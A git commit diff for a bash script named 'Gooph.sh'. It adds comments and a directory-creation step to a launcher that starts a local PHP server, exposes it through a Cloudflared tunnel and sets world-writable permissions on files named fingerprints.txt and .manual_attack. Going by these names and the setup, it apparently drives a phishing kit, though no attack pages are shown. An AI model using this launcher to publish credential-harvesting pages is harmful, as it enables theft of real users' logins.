3a4d318759c6fa4d075050a5f2a35228e29b7fd4
Randomryan <152279228+Notanotherdougy@users.noreply.github.com>
2024-06-19 12:50:01 +0200

    Update Gooph.sh

--- Gooph.sh
+++ Gooph.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 
+# Function to install necessary packages and tunnels if not already installed
 install_packages_and_tunnels() {
     if [[ -f .host/cloudflared ]]; then
         clear
@@ -15,6 +16,7 @@ install_packages_and_tunnels() {
     fi
 }
 
+# Function to check if the script is run as root on non-Android systems
 check_root_and_os() {
     if [[ $(uname -o) != Android && ${EUID:-$(id -u)} -ne 0 ]]; then
         clear
@@ -23,10 +25,17 @@ check_root_and_os() {
     fi
 }
 
+# Function to set permissions for necessary files and directories
 set_permissions() {
     chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
 }
 
+# Function to create necessary directories
+create_directories() {
+    mkdir -p .tunnels_log .www
+}
+
+# Function to create or update configuration file
 create_or_update_config() {
     config_file=".www/config.ini"
     if [[ -f $config_file ]]; then
@@ -49,10 +58,12 @@ EOL
     echo "Config file created/updated successfully."
 }
 
+# Function to start PHP server
 start_php_server() {
     cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 }
 
+# Function to start Cloudflared tunnel
 start_cloudflared() {
     echo -ne "\nStarting Cloudflared..."
     if [[ $(command -v termux-chroot) ]]; then
@@ -66,8 +77,10 @@ start_cloudflared() {
     echo -e "\nCloudflared URL: ${cldflr_url}"
 }
 
+# Main script execution
 install_packages_and_tunnels
 check_root_and_os
+create_directories
 set_permissions
 create_or_update_config
 start_php_server
